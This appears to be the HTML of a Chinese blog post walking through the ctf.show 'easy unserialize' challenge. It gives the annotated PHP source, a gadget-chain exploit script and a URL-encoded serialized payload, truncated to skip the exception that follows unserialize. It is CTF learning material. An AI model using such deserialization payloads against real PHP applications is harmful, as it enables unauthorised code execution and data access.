@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="keywords" content="个人博客" />
+  <meta name="description" content="sixxx1的个人博客" />
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
+  <link rel="dns-prefetch" href="https://at.alicdn.com">
+  
+  <link rel="dns-prefetch" href="https://widget.daovoice.io">
+  <link rel="dns-prefetch" href="https://widget-static-cdn.daovoice.io">
+  <link rel="dns-prefetch" href="https://im.daovoice.io">
+  
+  
+  <link rel="dns-prefetch" href="https://hm.baidu.com/">
+  
+  
+  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+  <link rel="dns-prefetch" href="https://api.github.com">
+  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com">
+  
+  <link rel="stylesheet" type="text/css" href="/./style/main.css">
+	<link rel="shortcut icon" href="/favicon.ico" title="Favicon">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+	<title>ctfshow_easy_unserialize</title>
+  
+  <script>var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?awwssw1snsnsnn1ndndnndnd99j";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s);})();
+  </script>
+  
+  
+    <script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/123456.js","daovoice");daovoice('init',{app_id: "123456"});daovoice('update');
+  </script>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <canvas id="pattern-placeholder" height="230"></canvas>
+<div class="navbar-header">
+  <a class="blog-title" href="/">Sixxx1</a>
+  <a class="face-img" href="/">
+    <img src="/img/avatar.jpeg">
+  </a>
+</div>
+<main>
+  <div class="article-title">
+    
+  
+  <h1 class="title">
+    ctfshow_easy_unserialize
+  </h1>
+  
+
+
+    <ul class="article-info">
+      <li>
+        发布
+        <time datetime="2022-03-05T03:08:47.000Z" itemprop="datePublished">2022-03-05</time>
+      </li>
+      <li>
+        
+    更新 <time datetime="2022-03-05T03:51:08.569Z" itemprop="dateUpdated">2022-03-05</time>
+
+      </li>
+      <li id="busuanzi_container_page_pv">
+        阅读 <span id="busuanzi_value_page_pv"></span>
+      </li>
+    </ul>
+  </div>
+  <div class="container">
+    <!-- 目录  -->
+        
+        <div id="toc" class="toc-article">
+          <!-- <strong class="toc-title">目录</strong> -->
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf-show-%E5%8D%B7%E7%8E%8B%E6%9D%AF-easy-unserialize"><span class="toc-text">[ctf.show] 卷王杯 easy unserialize</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E9%A2%98%E7%9B%AE"><span class="toc-text">0x00 题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-EXP"><span class="toc-text">0x01 EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E9%9A%BE%E7%82%B9"><span class="toc-text">两个难点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%9A%BE%E7%82%B91"><span class="toc-text">解决难点1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%9A%BE%E7%82%B92"><span class="toc-text">解决难点2</span></a></li></ol></li></ol></li></ol>
+        </div>
+        
+        <!-- 目录  -->
+    <div class="article">
+
+      <div class="content">
+        
+        <h1 id="ctf-show-卷王杯-easy-unserialize"><a href="#ctf-show-卷王杯-easy-unserialize" class="headerlink" title="[ctf.show] 卷王杯 easy unserialize"></a>[ctf.show] 卷王杯 easy unserialize</h1><blockquote>
+<p>来自 ctf.show 卷王杯 easy unserialize 题目</p>
+</blockquote>
+<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><p>一道PHP反序列化题目，拿到源码之后可以先边看代码边做一下注释，比如反序列化入口一般从 <code>__construct()</code>  和  <code>__destruct()</code> 函数开始（因为这两个是实例化一个类时一定会触发的方法，没有太多条件限制）。</p>
+<p>比如这道题，有 <code>__destruct()</code>  和 <code>__construct()</code>  的只有 <code>one</code> 和 <code> third</code> 两个类，其中 <code>third</code> 的构造函数只是做了一下私有变量赋值，没有再调用其他函数的利用价值，因此可以着重看一下 one 类的 <code>__destruct()</code> 函数，从这里入手开始找调用路径。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2022-02-01 11:25:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2022-02-07 15:08:18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./HappyYear.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        array_walk(<span class="keyword">$this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$fn</span>, <span class="variable">$prev</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;Happy_func&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;year_parm&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$talk</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$talk</span>&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;		<span class="comment">// 1、反序列化入口</span></span><br><span class="line">        @<span class="keyword">$this</span>-&gt;object-&gt;add();	  <span class="comment">// 所有类都没有 add() 函数，因此可以触发 __call() 方法，从而定位 second 类</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;		<span class="comment">// 4、从 seconde.addMe() 过来的</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;object-&gt;string;	<span class="comment">// 只有 third 有 string 变量，而且是私有变量，因此调用了 third.__get() 方法。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;		<span class="comment">// 3、第三步到这里</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wow you have sovled&quot;</span>.<span class="keyword">$this</span>-&gt;filename; <span class="comment">// 把filename当作字符串使用，所以可以调用 __toString() 方法，又找到 one 类</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;		<span class="comment">// 2、从 one.__destruct() 到了这里</span></span><br><span class="line">        call_user_func([<span class="keyword">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>); <span class="comment">// func 是 add，所以调用了 addMe() 函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;		<span class="comment">// 5、$name = &quot;string&quot;</span></span><br><span class="line">        <span class="variable">$var</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;  <span class="comment">// $var = $this-&gt;string;</span></span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();	<span class="comment">// 调用 $this-&gt;string[&quot;string&quot;]() 方法，接下去目标就只有 MeMeMe() 函数了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctfshow&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span>=unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;高一新生报道&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01-EXP"><a href="#0x01-EXP" class="headerlink" title="0x01 EXP"></a>0x01 EXP</h2><p>写exp的时候，可以把所有 class 的代码都复制过来，只是函数体内的代码可以注释掉，因为不需要真的去执行，只是为了生成序列化。</p>
+<h3 id="两个难点"><a href="#两个难点" class="headerlink" title="两个难点"></a>两个难点</h3><p>写exp遇到两个难点：</p>
+<ol>
+<li><p><code>$var[$string]()</code> 这里，要怎样才能调用到 <code>one.MeMeMe()</code>？</p>
+</li>
+<li><p>反序列化之后直接抛出异常，怎样绕过？</p>
+</li>
+</ol>
+<h3 id="解决难点1"><a href="#解决难点1" class="headerlink" title="解决难点1"></a>解决难点1</h3><p>对第一个问题百思不得其解，其中尝试过让 <code>$string[&#39;string&#39;] = &quot;one::MeMeMe&quot; </code>，等操作均不行，最终看了writeup才知道，还可以用数组的方式来指定某个对象，也就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$One3</span> = <span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$string</span>[<span class="string">&#x27;string&#x27;</span>] = [<span class="variable">$One3</span>, <span class="string">&quot;MeMeMe&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样的话执行</span></span><br><span class="line"><span class="variable">$string</span>[<span class="string">&#x27;string&#x27;</span>]();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 就能调用到 one.MeMeMe()</span></span><br></pre></td></tr></table></figure>
+
+<p>此时的完整EXP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line">    <span class="comment">// public $year_parm = array(0 =&gt; &quot;Happy_func&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[+] Into MeMeMe()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// @$this-&gt;object-&gt;add();      //  可调用 second.__call()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// return $this-&gt;object-&gt;string;       //  使用私有变量，可以调用 third.__get()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// return &quot;Wow you have sovled&quot;.$this-&gt;filename;       // 调用 __toString()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// call_user_func([$this, $func.&quot;Me&quot;], $args);     // 调用 addMe()，</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>; <span class="comment">// 如果 $string[&#x27;string&#x27;] = [$One3, &quot;MeMeMe&quot;]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// $var = $this-&gt;$name;        // var 就是 string</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;yes, this&quot;</span>;</span><br><span class="line">        <span class="comment">// $var[$name]();      // string[string]()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$One</span> = <span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$One2</span> = <span class="keyword">new</span> one();</span><br><span class="line"><span class="variable">$One3</span> = <span class="keyword">new</span> one();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Second</span> = <span class="keyword">new</span> second(<span class="variable">$One2</span>);</span><br><span class="line"><span class="variable">$One</span>-&gt;object = <span class="variable">$Second</span>;</span><br><span class="line"><span class="variable">$Third</span> = <span class="keyword">new</span> third(<span class="keyword">array</span>(<span class="string">&quot;string&quot;</span> =&gt; [<span class="variable">$One3</span>, <span class="string">&quot;MeMeMe&quot;</span>])); <span class="comment">// 这里是重点</span></span><br><span class="line"><span class="variable">$One2</span>-&gt;object = <span class="variable">$Third</span>;</span><br><span class="line"><span class="variable">$One3</span>-&gt;year_parm = <span class="keyword">array</span>(<span class="number">0</span> =&gt; <span class="string">&quot;Happy_func&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到序列化结果：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; php exp.php</span><br><span class="line"></span><br><span class="line">O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p>那么问题来到了第二个难点。。反序列化之后直接抛出了异常，不管能不能拿到flag都会异常。</p>
+<p><img src="image-20220305104951551.png" alt="image-20220305104951551"></p>
+<h3 id="解决难点2"><a href="#解决难点2" class="headerlink" title="解决难点2"></a>解决难点2</h3><p>还是看了writeup才知道，原来<strong>可以先让反序列化的时候提前产生异常，就不会走到下面的抛出异常</strong>。</p>
+<blockquote>
+<p> 怎样让反序列化产生异常，又不会影响反序列化操作？</p>
+</blockquote>
+<p>方法是，去掉序列化字符串里面结尾的花括号，也就是去掉 <code>%7D</code>。这样的序列化既是不完整的，又能进行正常反序列化。</p>
+<p>后面去掉几个 <code>%7D</code>  都可以，最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220305105438930.png" alt="image-20220305105438930"></p>
+
+      </div>
+        <!-- <div class="support-author">
+             </div>
+        -->
+        <!--
+            <div class="like ">
+              <div class="like-button">
+                <a id="like-note" href="">
+                  <i class="icon-heart"></i>喜欢
+                </a>
+              </div>
+              <span id="likes-count">256</span>
+            </div>
+        -->
+        <div class="otherLink">
+          <div class="previous">
+          </div>
+          <div class="next">
+          </div>
+        </div>
+        <div class="comments" id="comments">
+          
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+  const gitalk = new Gitalk({
+    clientID: '8888a8888',
+    clientSecret: '8888886666666',
+    repo: 'xxxx.github.io',
+    owner: 'admin',
+    admin: ['admin'],
+    id: location.pathname,      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false
+  })
+
+  gitalk.render('comments');
+</script>
+
+
+        </div>
+      </div>
+    </div>
+
+   </div>
+
+</main>
+<div class="footer">
+  <div class="info">
+    <p>
+    <a target="_blank" rel="noopener" href="https://hexo.io"> Hexo </a> 强力驱动 |
+      <a target="_blank" rel="noopener" href="https://github.com/Youthink/hexo-themes-yearn"> Yearn </a>
+      主题
+    </p>
+    <p>&copy;2021 </p>
+  </div>
+</div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true, 
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+<script>//console
+  var consoleConfig = ''.split(',');
+  var canConsole = true;
+  var consoleInfo = (function(consoleConfig) {
+  if (!canConsole || !consoleConfig || consoleConfig.length < 1) {
+    return;
+  }
+  var consoleColor = '#6190e8';
+  var _console;
+  var backgroundTextStyle = 'padding: 1px 5px;color: #fff;background: ' + consoleColor + ';'
+  var textStyle = 'color: ' + consoleColor + ';';
+
+  consoleConfig.map(o => {
+    var num = (o.match(/%c/g) || []).length;
+    if(/^http(s)?:\/\//.test(o)) {
+      console.log('%c     ', 'background: url(' + o + ') no-repeat left center;font-size: 180px;');
+      return;
+    }
+    if (num > 0) {
+      var logArguments = [];
+      for (var i = 0; i < num; i++) {
+        if (i % 2 === 0) {
+          logArguments.push(backgroundTextStyle);
+        } else {
+          logArguments.push(textStyle);
+        }
+      }
+      (_console = console).log.apply(_console, ['%c' + o, textStyle].concat(logArguments));
+      return;
+    }
+    console.log('%c' + o, textStyle);
+  });
+}(consoleConfig));</script><script type="text/javascript" src="/./js/main.js"></script>
+
+  <script src="//at.alicdn.com/t/font_159214_mvtxvg9me9.js"></script>
+</body>
+</html>
